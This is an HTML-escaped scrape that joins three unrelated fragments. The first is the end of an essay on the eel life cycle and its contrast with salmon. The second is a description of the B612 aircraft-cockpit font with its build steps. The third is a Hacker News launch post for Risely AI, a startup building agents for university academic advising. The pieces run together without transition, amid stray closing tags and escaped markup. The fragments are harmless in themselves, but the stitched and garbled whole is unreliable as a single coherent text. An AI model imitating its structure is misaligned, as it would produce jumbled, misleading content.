      &lt;p&gt;In their last metamorphosis, eels begin “silvering”: shedding their greenish yellow color for black and chrome. This is part of their preparation to head back to the ocean to breed. Their eel eyes get larger to be able to see better in the depths. Their stomachs dissolve—won’t be using that on this death mission. And finally (poor Freud), the eels’ sex organs develop to prepare for spawning. The eels swim thousands of miles back to the Sargasso, where they release billions of eggs and sperm into the Bermuda Triangle and die. Their young hatch as tiny glass specs adrift in the currents, and the cycle begins again.&lt;/p&gt;
      &lt;p&gt;So the next time you order unagi and salmon rolls, think about how the paths of their lives mirror one another: salmon spawn in rivers, live in the ocean, then fight their way back upstream to lay eggs, while eels do the reverse—born in the ocean, mature in rivers, and return to die in the deep. Upstream versus downstream, knowable and visible versus hidden, lost, and dark.&lt;/p&gt;
      &lt;p&gt;The life of an eel resists any tidy narrative, transforming from one strange and anomalous form to the next, only to vanish back into the depths that made it. What comes from nowhere should also return to nowhere, safe in its secrets.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;

    &lt;p&gt;B612 is an highly legible open source font family designed and tested to be used on aircraft cockpit screens.&lt;/p&gt;
    &lt;p&gt;Main characteristics are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maximize the distance between the forms of the characters&lt;/item&gt;
      &lt;item&gt;Respect the primitives of the different letters&lt;/item&gt;
      &lt;item&gt;Harmonize the forms and their spacing&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In 2010, Airbus initiated a research collaboration with ENAC and Université de Toulouse III on a prospective study to define and validate an “Aeronautical Font”: the challenge was to improve the display of information on the cockpit screens, in particular in terms of legibility and comfort of reading, and to optimize the overall homogeneity of the cockpit.&lt;/p&gt;
    &lt;p&gt;2 years later, Airbus came to find Intactile DESIGN to work on the design of the eight typographic variants of the font. This one, baptized B612 in reference to the imaginary asteroid of the aviator Saint‑Exupéry, benefited from a complete hinting on all the characters.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Update the version number in the font info of the source files&lt;/item&gt;
      &lt;item&gt;Make a copy of the source files&lt;/item&gt;
      &lt;item&gt;Open the copies in Fontlab&lt;/item&gt;
      &lt;item&gt;Run the merge intersection command on each file&lt;/item&gt;
      &lt;item&gt;Generate the ttf files&lt;/item&gt;
      &lt;item&gt;Run the build script from the scripts folder to fix digital signature&lt;/item&gt;
    &lt;/list&gt;

    &lt;div&gt;&lt;p&gt;Hi HN, I’m Danial, co-founder and CTO of Risely AI (&lt;/p&gt;https://risely.ai&lt;p&gt;). We're building AI agents that automate operational workflows inside universities. Here’s a demo: &lt;/p&gt;https://www.loom.com/share/d7a14400434144c490249d665a0d0499?...&lt;p&gt;.&lt;/p&gt;&lt;p&gt;Higher ed is full of inefficiencies. Every department runs on outdated systems that don’t talk to each other. Today, advising staff are looking up enrollment data in PeopleSoft or Ellucian, checking grades and assignments in Canvas, and trying to track engagement in a CRM, if they even have one. Often, it’s just spreadsheets and email. One advisor told us they were losing 8+ hours/week just trying to answer: “Which students are struggling?”. During that lag, students slip through the cracks, and every lost student costs a school tuition.&lt;/p&gt;&lt;p&gt;I’ve spent the last decade building large-scale systems, but about a year ago, I left my job to build something personal. My time at UC Berkeley reinforced what my parents taught me when we immigrated to the U.S. - that education is the most powerful tool for upward mobility. But nearly 40% of students never graduate. Many of these students are capable and just need support, but the systems meant to support them are overwhelmed and broken.&lt;/p&gt;&lt;p&gt;So we built Risely. Our first agent focuses on academic advising and retention. It connects to a school’s systems, unifies the data, flags at-risk students, drafts outreach, and answers natural-language questions about caseloads and course progress. It gives staff leverage and time back, while helping more students stay on track.&lt;/p&gt;&lt;p&gt;The harder part is everything under the hood: - Connecting to archaic SIS, LMS, and CRM systems with inconsistent APIs and data models - Normalizing messy institutional data into something agents can reason over - Handling real policy constraints around FERPA, isolating tenant data, and meeting strict security and privacy standards for student PII - Designing agent workflows that are traceable, reviewable, and safe to run in production - Building infrastructure that can adapt to different institutional rules, processes, and edge cases.&lt;/p&gt;&lt;p&gt;We started with advising because retention ties directly to both revenue and student success. But the same foundation applies to registrar, admissions, financial aid, research administration, and other critical functions. As more agents come online, they can begin to coordinate with each other and hopefully improve the entire operations of a college or university.&lt;/p&gt;&lt;p&gt;If you’ve built systems that had to reconcile messy data, inconsistent workflows, or policy constraints using LLMs, we’d love to hear how you approached it.&lt;/p&gt;&lt;p&gt;We’d love to hear your thoughts about the above, and anything in this space!&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
